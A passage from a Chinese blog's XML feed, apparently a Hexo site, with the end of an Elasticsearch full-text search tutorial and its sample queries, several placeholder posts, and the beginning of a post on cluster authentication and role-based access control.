class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的查询会匹配 <code>NaGesh Acchu</code>、<code>Acchu Acchu</code> 和 <code>acchu</code>。系统默认是在分词后匹配任何一个<code>token</code> 都可以完成匹配，如果修改 <code>operator</code> 为 <code>AND</code>，则会匹配同时包含 <code>nagesh</code> 和 <code>acchu</code> 的字段。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"nagesh acchu"</span>,</span><br><span class="line">        <span class="attr">"operator"</span>: <span class="string">"and"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个查询就只会返回 <code>NaGesh Acchu</code></p><p>查询的时候也可以使用模糊查询，修改 <code>fuzziness</code> 参数</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"nagesh acchu"</span>,</span><br><span class="line">        <span class="attr">"operator"</span>: <span class="string">"and"</span>,</span><br><span class="line">        <span class="attr">"fuzziness"</span>: <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的语句会匹配 <code>NaGesh Acchu</code> 还有 <code>Nagesh Bacchu</code></p><h2 id="text-搜索-match-bool-prefix"><a href="#text-搜索-match-bool-prefix" class="headerlink" title="text 搜索 - match_bool_prefix"></a>text 搜索 - match_bool_prefix</h2><p><code>match_bool_prefix</code> 会解析检索词，然后生成一个 <code>bool</code> 复合检索语句。如果检索词由很多个 <code>token</code> 构成，除了最后一个会进行 <code>prefix</code> 匹配，其他的会进行 <code>term</code> 匹配。</p><p>比如使用 <code>nagesh ac</code> 进行 <code>match_bool_prefix</code> 搜索</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_bool_prefix"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"nagesh ac"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的查询会匹配 <code>Nagesh Nagesh</code>、<code>Rakshith Achar</code> 或者 <code>ACoco</code></p><p>实际查询等价于</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"should"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"term"</span>: &#123;</span><br><span class="line">            <span class="attr">"name"</span>: &#123;</span><br><span class="line">              <span class="attr">"value"</span>: <span class="string">"nagesh"</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"prefix"</span>: &#123;</span><br><span class="line">            <span class="attr">"name"</span>: &#123;</span><br><span class="line">              <span class="attr">"value"</span>: <span class="string">"ac"</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="text-搜索-match-phrase"><a href="#text-搜索-match-phrase" class="headerlink" title="text 搜索 - match_phrase"></a>text 搜索 - match_phrase</h2><p>词组匹配会先解析检索词，并且标注出每个的 token 相对位置，搜索匹配的字段的必须包含所有的检索词的token，并且他们的相对位置也要和检索词里面相同。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_phrase"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"Bade Acche"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个搜索会匹配 <code>Bade Acche Lagte</code>，但是不会匹配 <code>Acche Bade Lagte</code> 或者 <code>Bade Lagte Acche</code>。</p><p>如果我们不要求这两个单词相邻，希望放松一点条件，可以添加 <code>slop</code> 参数，比如设置成 <code>1</code>，代表两个 token 之间相隔的最多的距离（最多需要移动多少次才能相邻）。下面的查询语句会匹配 <code>Bade Lagte Acche</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_phrase"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"Bade Acche"</span>,</span><br><span class="line">        <span class="attr">"slop"</span>: <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="text-搜索-match-phrase-prefix"><a href="#text-搜索-match-phrase-prefix" class="headerlink" title="text 搜索 - match_phrase_prefix"></a>text 搜索 - match_phrase_prefix</h2><p>match_phrase_prefix 相当于是结合了 <code>match_bool_prefix</code> 和 <code>match_phrase</code>。ES 会先解析检索词，分成很多个 token，然后除去最后一个 token，对其他的 token 进行 match_phrase 的匹配，即全部都要匹配并且相对位置相同；对于最后一个 token，需要进行前缀匹配并且匹配的这个单词在前面的 match_phrase 匹配的结果的后面。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_phrase_prefix"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"acchu ac"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的查询能够匹配 <code>Acchu Acchu1</code> 和 <code>Acchu Acchu Papu</code>，但是不能匹配 <code>acc acchu</code> 或者<code>acchu pa</code></p><h2 id="text-搜索-multi-match"><a href="#text-搜索-multi-match" class="headerlink" title="text 搜索 - multi_match"></a>text 搜索 - multi_match</h2><p><code>multi_match</code> 可以同时对多个字段进行查询匹配，ES支持很多种不同的查询类型比如 <code>best_fields</code>（任何字段 <code>match</code> 检索词都表示匹配成功）、<code>phrase</code>（用 <code>match_phrase</code> 代替 <code>match</code>）还有<code>cross_field</code>（交叉匹配，通常用在所有的 token 必须在至少一个字段中出现）等等</p><p>下面是普通的 <code>best_fields</code> 的匹配</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"acchu"</span>,</span><br><span class="line">      <span class="attr">"fields"</span>: [</span><br><span class="line">        <span class="string">"name"</span>,</span><br><span class="line">        <span class="string">"intro"</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要 <code>name</code> 或者 <code>intro</code> 字段任何一个包含 <code>acchu</code> 都会完成匹配。</p><p>如果使用 <code>cross_fields</code> 匹配如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"call acchu"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"cross_fields"</span>,</span><br><span class="line">      <span class="attr">"fields"</span>: [</span><br><span class="line">        <span class="string">"name"</span>,</span><br><span class="line">        <span class="string">"intro"</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"operator"</span>: <span class="string">"and"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的匹配需要同时满足下面两个条件:</p><ul><li><code>name</code> 中出现 <code>call</code> 或 <code>intro</code> 中出现 <code>call</code></li><li><code>name</code> 中出现 <code>acchu</code> 或 <code>intro</code> 中出现 <code>acchu</code></li></ul><p>所以这个查询能够匹配 <code>name</code> 包含 <code>acchu</code> 和 <code>intro</code> 包含 <code>call</code> 的文档，或者匹配 <code>name</code> 同时包含 <code>call</code> 和 <code>acchu</code> 的文档。</p><h2 id="text-搜索-common"><a href="#text-搜索-common" class="headerlink" title="text 搜索 - common"></a>text 搜索 - common</h2><p>common 查询会把查询语句分成两个部分，较为重要的分为一个部分（这个部分的 token 通常在文章中出现频率比较低），不那么重要的为一个部分（出现频率比较高，以前可能被当作停止词），然后分别用<code>low_freq_operator</code>、<code>high_freq_operator</code> 以及 <code>minimum_should_match</code> 来控制这些语句的表现。</p><p>在进行查询之前需要指定一个区分高频和低频词的分界点，也就是 <code>cutoff_frequency</code>，它既可以是小数比如<code>0.001</code> 代表该字段所有的 token 的集合里面出现的频率也可以是大于 <code>1</code> 的整数代表这个词出现的次数。当 token 的频率高于这一个阈值的时候，他就会被当作高频词。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"common"</span>: &#123;</span><br><span class="line">      <span class="attr">"body"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"nelly the elephant as a cartoon"</span>,</span><br><span class="line">        <span class="attr">"cutoff_frequency"</span>: <span class="number">0.001</span>,</span><br><span class="line">        <span class="attr">"low_freq_operator"</span>: <span class="string">"and"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中高频词是 <code>the</code>、<code>a</code> 和 <code>as</code> ，低频词是 <code>nelly</code>、<code>elephant</code> 和 <code>cartoon</code>，上面的搜索大致等价于下面的查询</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must"</span>: [</span><br><span class="line">        &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"body"</span>: <span class="string">"nelly"</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"body"</span>: <span class="string">"elephant"</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"body"</span>: <span class="string">"cartoon"</span>&#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"should"</span>: [</span><br><span class="line">        &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"body"</span>: <span class="string">"the"</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"body"</span>: <span class="string">"as"</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"body"</span>: <span class="string">"a"</span>&#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是第一个查询的效率要优于第二个，因为 <code>common</code> 语句有性能上的优化，只有重要的 <code>token</code> 匹配之后的文档，才会在不重要的文档的查询时候计算 <code>_score</code>；不重要的 token 在查询的时候不会计算 <code>_score</code></p><h2 id="text-搜索-query-string"><a href="#text-搜索-query-string" class="headerlink" title="text 搜索 - query_string"></a>text 搜索 - query_string</h2><p>输入一个查询语句，返回和这个查询语句匹配的所有的文档。</p><p>这个查询语句不是简单的检索词，而是包含特定语法的的搜索语句，里面包含操作符比如 <code>AND</code> 和 <code>OR</code>，在进行查询之前会被一个语法解析器解析，转化成可以执行的搜索语句进行搜索。用户可以生成一个特别复杂的查询语句，里面可能包含通配符、多字段匹配等等。在搜索之前 ES 会检查查询语句的语法，如果有语法错误会直接报错。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"query_string"</span>: &#123;</span><br><span class="line">      <span class="attr">"default_field"</span>: <span class="string">"name"</span>,</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"acchu AND nagesh"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的查询会匹配所有的同时包含 <code>acchu</code> 和 <code>nagesh</code> 的结果。简化一下可以这样写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"query_string"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"name: acchu AND nagesh"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query_string 里面还支持更加复杂的写法：</p><ul><li><code>name: acchu nagesh</code>：查询 <code>name</code> 包含 <code>acchu</code> 和 <code>nagesh</code> 其中的任意一个</li><li><code>book.\*:(quick OR brown)</code>：<code>book</code> 的任何子字段比如 <code>book.title</code> 和 <code>book.content</code>，包含 <code>quick</code> 或者 <code>brown</code></li><li><code>_exists_: title</code>：<code>title</code> 字段包含非 <code>null</code> 值</li><li><code>name: acch*</code>：通配符，匹配任何 <code>acch</code> 开头的字段</li><li><code>name:/joh?n(ath[oa]n)/</code>：正则表达式，需要把内容放到两个斜杠 <code>/</code> 中间</li><li><code>name: acch~</code>：模糊匹配，默认编辑距离为 2，不过80%的情况编辑距离为1就能解决问题 <code>name: acch~1</code></li><li><code>count:[1 TO 5]</code>：范围查询，或者 <code>count: &gt;10</code></li></ul><p>下面的查询允许匹配多个字段，字段之间时 <code>OR</code> 的关系</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"query_string"</span>: &#123;</span><br><span class="line">      <span class="attr">"fields"</span>: [</span><br><span class="line">        <span class="string">"name"</span>,</span><br><span class="line">        <span class="string">"intro"</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"nagesh"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="text-搜索-simple-query-string"><a href="#text-搜索-simple-query-string" class="headerlink" title="text 搜索 - simple_query_string"></a>text 搜索 - simple_query_string</h2><p>和上面的 <code>query_string</code> 类似，但是使用了更加简单的语法。使用了下面的操作符：</p><ul><li><code>+</code> 表示 <code>AND</code> 操作</li><li><code>|</code> 表示 <code>OR</code> 操作</li><li><code>-</code> 表示否定</li><li><code>&quot;</code> 用于圈定一个短语</li><li><code>*</code> 放在 token 的后面表示前缀匹配</li><li><code>()</code> 表示优先级</li><li><code>~N</code> 放在 token 后面表示模糊查询的最大编辑距离 <code>fuzziness</code></li><li><code>~N</code> 放在 phrase 后面表示模糊匹配短语的 <code>slop</code> 值</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"simple_query_string"</span>: &#123;</span><br><span class="line">      <span class="attr">"query"</span>: <span class="string">"acch* + foll~2 + -Karen"</span>,</span><br><span class="line">      <span class="attr">"fields"</span>: [</span><br><span class="line">        <span class="string">"intro"</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的搜索相当于搜索包含前缀为 <code>acch</code> 的、和 <code>foll</code> 编辑距离最大是 <code>2</code> 的并且不包含 <code>Karen</code> 的字段，这样的语句会匹配 <code>call me acchu</code> 或者 <code>acchu follow me</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Elasticsearch 提供了强大的搜索功能，使用 <code>query</code> 匹配可以进行相关性的计算排序但是 <code>filter</code> 可能更加适用于大多数的过滤查询的情况，如果用户对于标准解析器不太满意可以自定义解析器或者第三方解析器比如支持中文的 <code>IK</code> 解析器。</p><p>在进行搜索的时候一定要注意搜索 <code>keyword</code> 和 <code>text</code> 字段时候的区别，使用 <code>term</code> 相关的查询只能匹配单个的 <code>token</code> 但是使用 <code>text</code> 相关的搜索可以利用前面的 <code>term</code> 搜索进行组合查询，<code>text</code> 搜索更加灵活强大，但是性能相对差一点。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《Elasticsearch核心技术与实战》</li><li><a href="https://www.cnblogs.com/sunshuyi/p/12716828.html" target="_blank" rel="noopener">https://www.cnblogs.com/sunshuyi/p/12716828.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/full-text-queries.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/full-text-queries.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/term-level-queries.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/term-level-queries.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Elasticsearch 搜索 API 整理。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>基于 Flink SQL CDC 的实时数据同步方案</title>
    <link href="https://xinlichao.cn/back-end/big-data/flink-sql-cdc/"/>
    <id>https://xinlichao.cn/back-end/big-data/flink-sql-cdc/</id>
    <published>2021-02-14T16:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>鸽了……</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;鸽了……&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
      <category term="Flink" scheme="https://xinlichao.cn/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 Canal 数据同步方案</title>
    <link href="https://xinlichao.cn/back-end/big-data/canal-sync-es/"/>
    <id>https://xinlichao.cn/back-end/big-data/canal-sync-es/</id>
    <published>2021-02-13T13:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.666Z</updated>
    
    <content type="html"><![CDATA[<p>鸽了……</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;鸽了……&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
      <category term="Canal" scheme="https://xinlichao.cn/tags/Canal/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 ES 实战</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-09/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-09/</id>
    <published>2021-02-12T13:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>鸽了……</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;鸽了……&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 ELK 数据分析</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-08/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-08/</id>
    <published>2021-02-10T22:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>鸽了……</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;鸽了……&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 Elasticsearch 集群管理</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-07/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-07/</id>
    <published>2021-02-09T22:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>深入了解 ES 集群管理、生产环境建议等。</p><a id="more"></a><h2 id="管集群身份认证与用户鉴权"><a href="#管集群身份认证与用户鉴权" class="headerlink" title="管集群身份认证与用户鉴权"></a>管集群身份认证与用户鉴权</h2><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><p><img src="/images/big-data/es-07/1.jpg" alt="1"></p><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><ul><li>ES 在默认安装后，不提供任何形式的安全防护</li><li>错误的配置信息导致公网可以访问 ES 集群<ul><li>在 elasticsearch.yml 文件中，server.host 被错误的配置为 0.0.0.0</li></ul></li></ul><h3 id="数据安全性的基本需求"><a href="#数据安全性的基本需求" class="headerlink" title="数据安全性的基本需求"></a>数据安全性的基本需求</h3><ul><li>身份认证<ul><li>鉴定用户是否合法</li></ul></li><li>用户鉴权<ul><li>指定哪个用户可以访问哪个索引</li></ul></li><li>传输加密</li><li>日志审计</li></ul><p><img src="/images/big-data/es-07/2.jpg" alt="2"></p><h3 id="一些免费的方案"><a href="#一些免费的方案" class="headerlink" title="一些免费的方案"></a>一些免费的方案</h3><ul><li>设置 Nginx 的反向代理</li><li>安装免费的 Security 插件<ul><li>Search Guard - <a href="https://search-guard.com/" target="_blank" rel="noopener">https://search-guard.com/</a></li><li>ReadOnly REST - <a href="https://github.com/sscarduzio/elasticsearch-readonlyrest-plugin" target="_blank" rel="noopener">https://github.com/sscarduzio/elasticsearch-readonlyrest-plugin</a></li></ul></li><li>X-Pack 的 Basic 版<ul><li>从 ES 6.8 &amp; ES 7.0 开始，Security 纳入 x-pack 的 Basic 版本中，免费使用一些基本的功能</li><li><a href="https://www.elastic.co/cn/what-is/elastic-stack-security" target="_blank" rel="noopener">https://www.elastic.co/cn/what-is/elastic-stack-security</a></li></ul></li></ul><h3 id="Anthentication-身份认证"><a href="#Anthentication-身份认证" class="headerlink" title="Anthentication - 身份认证"></a>Anthentication - 身份认证</h3><ul><li>认证体系的几种类型<ul><li>提供用户名和密码</li><li>提供秘钥或 Kerberos 票据</li></ul></li><li>Realms : X-Pack 中的认证服务<ul><li>内置 Realms （免费）<ul><li>File / Native (用户名密码保存在 Elasticsearch)</li></ul></li><li>外部 Realms （收费）<ul><li>LDAP / Active Directory / PKI / SAML / Kerberos</li></ul></li></ul></li></ul><h3 id="RBAC-用户鉴权"><a href="#RBAC-用户鉴权" class="headerlink" title="RBAC - 用户鉴权"></a>RBAC - 用户鉴权</h3><ul><li>什么是 RBAC：Role Based Access Control， 定义一个角色，并分配一组权限。权限包括索引级，字段级，集群级的不同的操作。然后通过将角色分配给用户，使得用户拥有这些权限<ul><li>User：The authenticated User</li><li>Role：A named set of permissions</li><li>Permission – A set of one or more privileges against a secured resource</li><li>Privilege – A named group of 1 or more actions that user may execute against a secured resource</li></ul></li></ul><h3 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h3><ul><li>Cluster Privileges<ul><li>all / monitor / manager / manage_index / manage_index_template / manage_rollup</li></ul></li><li>Indices Privileges<ul><li>all / create / create_index / delete / delete_index / index / manage / read /writeview_index_metadata</li></ul></li></ul><h3 id="创建内置的用户和角色"><a href="#创建内置的用户和角色" class="headerlink" 